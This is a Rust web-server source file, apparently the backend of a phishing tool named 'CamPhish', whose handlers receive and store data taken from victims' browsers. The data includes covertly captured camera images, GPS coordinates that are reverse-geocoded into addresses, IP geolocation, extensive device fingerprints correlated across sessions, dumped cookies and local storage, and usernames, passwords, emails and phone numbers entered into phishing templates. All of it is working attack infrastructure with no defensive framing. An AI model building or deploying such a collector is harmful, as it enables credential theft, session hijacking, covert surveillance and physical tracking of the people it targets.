use crate::AppState;
use axum::extract::State;
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde::Deserialize;
use std::sync::Arc;
use base64::Engine;

#[derive(Deserialize)]
pub struct ImagePayload {
    cat: String,
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    capture_method: Option<String>,
}

#[derive(Deserialize)]
pub struct LocationPayload {
    lat: f64,
    lon: f64,
    #[serde(default)]
    acc: Option<f64>,
    #[serde(default)]
    altitude: Option<f64>,
    #[serde(default)]
    heading: Option<f64>,
    #[serde(default)]
    speed: Option<f64>,
    #[serde(default)]
    session: Option<String>,
}

#[derive(Deserialize)]
pub struct IpPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    client_ip: Option<String>,
}

#[derive(Deserialize)]
pub struct FingerprintPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(flatten)]
    extra: serde_json::Value,
}

#[derive(Deserialize)]
pub struct EventPayload {
    #[serde(default)]
    session: Option<String>,
    event_type: String,
    #[serde(default)]
    event_data: Option<serde_json::Value>,
}

#[derive(Deserialize)]
pub struct StoragePayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(flatten)]
    extra: serde_json::Value,
}

#[derive(Deserialize)]
pub struct CredentialPayload {
    #[serde(default)]
    session: Option<String>,
    #[serde(default)]
    template_id: Option<String>,
    #[serde(default)]
    username: Option<String>,
    #[serde(default)]
    password: Option<String>,
    #[serde(default)]
    email: Option<String>,
    #[serde(default)]
    phone: Option<String>,
}

fn sanitize_session(session: &str) -> String {
    session.chars()
        .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
        .take(64)
        .collect()
}

fn get_session(session: &Option<String>) -> String {
    let raw = session.clone().filter(|s| !s.is_empty()).unwrap_or_else(|| "default".into());
    sanitize_session(&raw)
}

pub async fn receive_image(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<ImagePayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let (mime, b64_data) = match payload.cat.split_once(',') {
        Some((header, data)) if !data.is_empty() => {
            let mime = if let Some(s) = header.strip_prefix("data:") {
                s.split(';').next().unwrap_or("image/png").to_string()
            } else {
                "image/png".to_string()
            };
            (mime, data)
        }
        _ => return Err(StatusCode::BAD_REQUEST),
    };
    let raw = base64::engine::general_purpose::STANDARD.decode(b64_data)
        .map_err(|_| StatusCode::BAD_REQUEST)?;
    if raw.is_empty() { return Err(StatusCode::BAD_REQUEST); }

    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let ext = mime.split('/').nth(1).unwrap_or("png");
    let filename = format!("{}_{}.{}", session_id, chrono::Utc::now().format("%Y%m%d%H%M%S%f"), ext);
    let file_path = format!("{}/captures/{}", state.data_dir, filename);
    let method = payload.capture_method.unwrap_or_else(|| "canvas".into());

    tokio::fs::write(&file_path, &raw).await.map_err(|e| { tracing::error!("File write failed: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    sqlx::query(
        "INSERT INTO captures (id, session_id, filename, file_type, file_size, file_path, capture_method, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&filename)
    .bind(&mime).bind(raw.len() as i64).bind(&file_path).bind(&method).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite capture insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    let _ = sqlx::query("UPDATE templates SET total_camera_grants = total_camera_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
        .bind(&session_id).execute(&state.pool).await;
    log_event(&state, &session_id, "camera_capture", serde_json::json!({"filename": filename, "size": raw.len(), "method": method})).await;
    tracing::info!("📸 Capture: {} ({} bytes, {}) session={}", filename, raw.len(), method, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_location(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<LocationPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let now = chrono::Utc::now().timestamp();

    // Deduplicate: skip if same lat/lon within 60 seconds
    let recent: Option<(i64,)> = sqlx::query_as(
        "SELECT created_at FROM locations WHERE session_id = ? AND ABS(latitude - ?) < 0.0001 AND ABS(longitude - ?) < 0.0001 AND created_at > ? ORDER BY created_at DESC LIMIT 1"
    ).bind(&session_id).bind(payload.lat).bind(payload.lon).bind(now - 60)
    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if recent.is_some() {
        tracing::debug!("📍 Duplicate location skipped for session {}", session_id);
        return Ok(StatusCode::OK);
    }

    let loc_id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO locations (id, session_id, latitude, longitude, accuracy, altitude, heading, speed, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&loc_id).bind(&session_id)
    .bind(payload.lat).bind(payload.lon).bind(payload.acc)
    .bind(payload.altitude).bind(payload.heading).bind(payload.speed).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite location insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    // Reverse geocode in background (with rate limiting)
    let pool = state.pool.clone();
    let http = state.http.clone();
    let limiter = state.external_api_limiter.clone();
    let lat = payload.lat;
    let lon = payload.lon;
    tokio::spawn(async move {
        // Nominatim: 1 req/sec — acquire permit + sleep 1.2s between calls
        let _permit = limiter.acquire().await.expect("semaphore not closed");
        tokio::time::sleep(std::time::Duration::from_millis(1200)).await;
        let url = format!(
            "https://nominatim.openstreetmap.org/reverse?lat={}&lon={}&format=json&addressdetails=1&zoom=16",
            lat, lon
        );
        match http.get(&url).header("User-Agent", "CamPhish/2.1/geocode").send().await {
            Ok(r) if r.status().is_success() => {
                if let Ok(geo) = r.json::<serde_json::Value>().await {
                    let addr = geo.get("display_name").and_then(|v| v.as_str()).unwrap_or("");
                    if !addr.is_empty() {
                        let _ = sqlx::query("UPDATE locations SET address = ? WHERE id = ?")
                            .bind(addr).bind(&loc_id).execute(&pool).await;
                    }
                }
            }
            Ok(r) => tracing::debug!("Nominatim geocode returned {} for {}/{}", r.status(), lat, lon),
            Err(e) => tracing::debug!("Nominatim geocode request failed for {}/{}: {}", lat, lon, e),
        }
    });

    let _ = sqlx::query("UPDATE templates SET total_location_grants = total_location_grants + 1 WHERE id = (SELECT template_id FROM sessions WHERE id = ?)")
        .bind(&session_id).execute(&state.pool).await;
    log_event(&state, &session_id, "location_granted", serde_json::json!({"lat": payload.lat, "lon": payload.lon, "acc": payload.acc})).await;
    tracing::info!("📍 Location: {}, {} session={}", payload.lat, payload.lon, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_ip(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<IpPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&body.session);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();

    // Deduplicate: skip if same IP+session within 5 minutes
    let recent: Option<(i64,)> = sqlx::query_as(
        "SELECT created_at FROM ip_logs WHERE session_id = ? AND ip_address = ? AND created_at > ? ORDER BY created_at DESC LIMIT 1"
    ).bind(&session_id).bind(&ip).bind(now - 300)
    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if recent.is_some() {
        tracing::debug!("🌐 Duplicate IP skipped for session {}", session_id);
        return Ok(StatusCode::OK);
    }

    let client_local_ip = body.client_ip.clone().unwrap_or_default();
    let ip_id = uuid::Uuid::new_v4().to_string();
    sqlx::query(
        "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&ip_id).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite IP insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    if !client_local_ip.is_empty() {
        let _ = sqlx::query("UPDATE ip_logs SET geo_data = ? WHERE id = ?")
            .bind(serde_json::json!({"client_ip": client_local_ip}).to_string())
            .bind(&ip_id)
            .execute(&state.pool).await;
    }

    // IP geolocation in background with rate limiting (ip-api.com: 45 req/min)
    if !ip.starts_with("10.") && !ip.starts_with("192.168.") && !ip.starts_with("172.16.") && !ip.starts_with("127.") && ip != "unknown" {
        let pool = state.pool.clone();
        let http = state.http.clone();
        let limiter = state.external_api_limiter.clone();
        let ip_clone = ip.clone();
        tokio::spawn(async move {
            let _permit = limiter.acquire().await.expect("semaphore not closed");
            let url = format!("http://ip-api.com/json/{}?fields=status,message,city,region,country,lat,lon,isp,org,as,query", ip_clone);
            match http.get(&url).send().await {
                Ok(r) if r.status().is_success() => {
                    if let Ok(geo) = r.json::<serde_json::Value>().await {
                        if geo.get("status").and_then(|s| s.as_str()) == Some("success") {
                            let city = geo.get("city").and_then(|v| v.as_str()).unwrap_or("");
                            let country = geo.get("country").and_then(|v| v.as_str()).unwrap_or("");
                            let _ = sqlx::query("UPDATE ip_logs SET city = ?, country = ?, geo_data = ? WHERE id = ?")
                                .bind(city).bind(country).bind(geo.to_string()).bind(&ip_id)
                                .execute(&pool).await;
                        }
                    }
                }
                Ok(r) => tracing::debug!("IP geolocation returned {} for {}", r.status(), ip_clone),
                Err(e) => tracing::debug!("IP geolocation request failed for {}: {}", ip_clone, e),
            }
        });
    }

    log_event(&state, &session_id, "page_visit", serde_json::json!({"ip": ip, "device": device, "browser": browser})).await;
    tracing::info!("🌐 IP: {} ({} on {}) session={}", ip, browser, os, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_fingerprint(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<FingerprintPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let ua = headers.get("user-agent").and_then(|v| v.to_str().ok()).unwrap_or("unknown").to_string();
    let (device, browser, os) = parse_ua(&ua);
    let now = chrono::Utc::now().timestamp();
    let e = &payload.extra;
    let id = uuid::Uuid::new_v4().to_string();

    // Helper: extract str from json value
    let gs = |k: &str| -> Option<&str> { e.get(k).and_then(|v| v.as_str()) };
    let gi = |k: &str| -> Option<i64> { e.get(k).and_then(|v| v.as_i64()) };
    let gf = |k: &str| -> Option<f64> { e.get(k).and_then(|v| v.as_f64()) };
    let gb = |k: &str| -> Option<bool> { e.get(k).and_then(|v| v.as_bool()) };

    sqlx::query(
        "INSERT INTO ip_logs (\
            id, session_id, ip_address, user_agent, device, browser, os, \
            screen_resolution, color_depth, timezone, timezone_offset, language, languages, platform, \
            pixel_ratio, hardware_concurrency, device_memory, max_touch_points, cookie_enabled, do_not_track, \
            canvas_fingerprint, webgl_fingerprint, webgl_vendor, webgl_renderer, font_list, font_count, \
            audio_sample_rate, connection_type, connection_downlink, connection_rtt, \
            battery_level, battery_charging, \
            camera_count, microphone_count, has_gyroscope, has_accelerometer, \
            voice_count, voice_languages, local_ip, \
            created_at\
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(&id).bind(&session_id).bind(&ip).bind(&ua)
    .bind(&device).bind(&browser).bind(&os)
    .bind(gs("screen_resolution"))
    .bind(gi("color_depth"))
    .bind(gs("timezone"))
    .bind(gi("timezone_offset"))
    .bind(gs("language"))
    .bind(gs("languages"))
    .bind(gs("platform"))
    .bind(gf("pixel_ratio"))
    .bind(gi("hardware_concurrency"))
    .bind(gf("device_memory"))
    .bind(gi("max_touch_points"))
    .bind(gb("cookie_enabled"))
    .bind(gs("do_not_track"))
    .bind(gs("canvas_fingerprint"))
    .bind(gs("webgl_fingerprint"))
    .bind(gs("webgl_vendor"))
    .bind(gs("webgl_renderer"))
    .bind(gs("font_list"))
    .bind(gi("font_count"))
    .bind(gi("audio_sample_rate"))
    .bind(gs("connection_type"))
    .bind(gf("connection_downlink"))
    .bind(gi("connection_rtt"))
    .bind(gf("battery_level"))
    .bind(gb("battery_charging"))
    .bind(gi("camera_count"))
    .bind(gi("microphone_count"))
    .bind(gb("has_gyroscope"))
    .bind(gb("has_accelerometer"))
    .bind(gi("voice_count"))
    .bind(gs("voice_languages"))
    .bind(gs("local_ip"))
    .bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite fingerprint insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    // Cross-session correlation
    if let Some(canvas_fp) = gs("canvas_fingerprint") {
        let matches: Vec<(String,)> = sqlx::query_as(
            "SELECT DISTINCT session_id FROM ip_logs WHERE canvas_fingerprint = ? AND session_id != ?"
        ).bind(canvas_fp).bind(&session_id).fetch_all(&state.pool).await.unwrap_or_default();

        if !matches.is_empty() {
            let other_sessions: Vec<String> = matches.into_iter().map(|(s,)| s).collect();
            tracing::warn!("🔗 Cross-session correlation: {} matches sessions: {:?}", canvas_fp, other_sessions);
            log_event(&state, &session_id, "cross_session_match", serde_json::json!({"matched_sessions": other_sessions})).await;
        }
    }

    log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": gs("canvas_fingerprint").is_some()})).await;

    let has_canvas = gs("canvas_fingerprint").is_some();
    if has_canvas {
        let _ = sqlx::query(
            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
        )
        .bind(uuid::Uuid::new_v4().to_string())
        .bind("target").bind("capture").bind("fingerprint")
        .bind(None::<String>).bind(&session_id)
        .bind(serde_json::json!({"device": device, "browser": browser, "os": os, "has_canvas": has_canvas}).to_string())
        .bind(&ip).bind(now)
        .execute(&state.pool).await;
    }

    tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
    Ok(StatusCode::OK)
}

pub async fn receive_event(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<EventPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let data_str = payload.event_data.map(|d| serde_json::to_string(&d).unwrap_or_default());
    let now = chrono::Utc::now().timestamp();

    sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
        .bind(&payload.event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await.map_err(|e| { tracing::error!("SQLite event insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    Ok(StatusCode::OK)
}

pub async fn receive_storage(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(body): Json<StoragePayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&body.session);
    let now = chrono::Utc::now().timestamp();
    let id = uuid::Uuid::new_v4().to_string();
    let data_str = serde_json::to_string(&body.extra).unwrap_or_default();

    sqlx::query("INSERT INTO storage_dumps (id, session_id, data, ip_address, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(&id).bind(&session_id).bind(&data_str).bind(&ip).bind(now)
        .execute(&state.pool).await.map_err(|e| { tracing::error!("Storage insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    let key_types: Vec<&str> = ["cookies", "localStorage", "sessionStorage"].iter()
        .filter(|&&k| body.extra.get(k).is_some())
        .copied()
        .collect();

    let cookie_count = body.extra.get("cookies")
        .and_then(|c| c.as_object())
        .map(|o| o.len())
        .unwrap_or(0);
    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("target").bind("capture").bind("storage")
    .bind(Some(&id)).bind(&session_id)
    .bind(serde_json::json!({"key_types": key_types, "cookie_count": cookie_count}).to_string())
    .bind(&ip).bind(now)
    .execute(&state.pool).await;

    log_event(&state, &session_id, "storage_captured", serde_json::json!({
        "key_types": key_types,
    })).await;

    tracing::info!("💾 Storage dump received for session {} (IP: {})", session_id, ip);
    Ok(StatusCode::OK)
}

pub async fn receive_credentials(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(payload): Json<CredentialPayload>,
) -> Result<StatusCode, StatusCode> {
    let ip = extract_ip(&headers);
    if !check_rate_limit(&state, &ip, 60, 60) {
        return Err(StatusCode::TOO_MANY_REQUESTS);
    }
    let session_id = get_session(&payload.session);
    let now = chrono::Utc::now().timestamp();

    let recent: Option<(Option<String>, Option<String>, Option<String>, i64)> = sqlx::query_as(
        "SELECT username, password, template_id, created_at FROM credentials WHERE session_id = ? AND ip_address = ? ORDER BY created_at DESC LIMIT 1"
    ).bind(&session_id).bind(&ip)
    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

    if let Some((u, p, t, ts)) = recent {
        if now - ts < 300 && u == payload.username && p == payload.password && t == payload.template_id {
            tracing::debug!("🔑 Duplicate credentials skipped for session {}", session_id);
            return Ok(StatusCode::OK);
        }
    }

    sqlx::query(
        "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string()).bind(&session_id)
    .bind(&payload.template_id).bind(&payload.username).bind(&payload.password)
    .bind(&payload.email).bind(&payload.phone).bind(&ip).bind(now)
    .execute(&state.pool).await.map_err(|e| { tracing::error!("Credential insert FAILED: {}", e); StatusCode::INTERNAL_SERVER_ERROR })?;

    log_event(&state, &session_id, "credentials_captured", serde_json::json!({
        "template": payload.template_id,
        "username": payload.username.is_some(),
    })).await;

    let _ = sqlx::query(
        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
    )
    .bind(uuid::Uuid::new_v4().to_string())
    .bind("target").bind("capture").bind("credential")
    .bind(payload.template_id.as_deref()).bind(&session_id)
    .bind(serde_json::json!({"username": payload.username.is_some(), "template": payload.template_id}).to_string())
    .bind(&ip).bind(now)
    .execute(&state.pool).await;

    tracing::info!("🔑 Credentials: {} session={}", payload.username.as_deref().unwrap_or("?"), session_id);
    Ok(StatusCode::OK)
}

async fn log_event(state: &AppState, session_id: &str, event_type: &str, data: serde_json::Value) {
    let now = chrono::Utc::now().timestamp();
    let data_str = serde_json::to_string(&data).unwrap_or_default();
    let _ = sqlx::query("INSERT INTO events (id, session_id, event_type, event_data, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(uuid::Uuid::new_v4().to_string()).bind(session_id)
        .bind(event_type).bind(&data_str).bind(now)
        .execute(&state.pool).await;
}

pub fn check_rate_limit(
    state: &AppState,
    ip: &str,
    max_requests: u32,
    window_secs: u64,
) -> bool {
    let mut limiter = state.rate_limiter.lock().unwrap();
    let now = std::time::Instant::now();
    let entry = limiter.entry(ip.to_string()).or_insert((0, now));
    if entry.1.elapsed().as_secs() > window_secs {
        *entry = (1, now);
        true
    } else {
        entry.0 += 1;
        if entry.0 > max_requests {
            false
        } else {
            true
        }
    }
}

fn extract_ip(headers: &HeaderMap) -> String {
    headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| s.split(',').next())
        .or_else(|| headers.get("x-real-ip").and_then(|v| v.to_str().ok()))
        .unwrap_or("unknown")
        .trim()
        .to_string()
}

fn parse_ua(ua: &str) -> (String, String, String) {
    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") { "Mobile" }
        else if ua.contains("Tablet") || ua.contains("iPad") { "Tablet" }
        else { "Desktop" };
    let browser = if ua.contains("Edg/") { "Edge" }
        else if ua.contains("Chrome/") { "Chrome" }
        else if ua.contains("Firefox/") { "Firefox" }
        else if ua.contains("Safari/") && !ua.contains("Chrome") { "Safari" }
        else { "Unknown" };
    let os = if ua.contains("Windows NT") { "Windows" }
        else if ua.contains("Mac OS X") { "macOS" }
        else if ua.contains("Android") { "Android" }
        else if ua.contains("iPhone") || ua.contains("iPad") || ua.contains("iOS") { "iOS" }
        else if ua.contains("Linux") { "Linux" }
        else { "Unknown" };
    (device.into(), browser.into(), os.into())
}
